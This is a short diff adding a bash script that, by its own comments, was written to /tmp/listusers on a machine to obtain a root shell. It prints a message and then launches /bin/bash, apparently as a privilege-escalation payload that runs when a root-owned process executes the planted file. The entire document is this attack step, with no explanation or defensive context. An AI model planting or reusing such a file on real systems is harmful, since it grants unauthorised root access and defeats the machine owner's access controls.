@@ -1,0 +1,7 @@
+#!/bin/bash
+#this file was write into machine /tmp/listusers
+# to get root shell
+
+echo "sending the root shell"
+
+/bin/bash
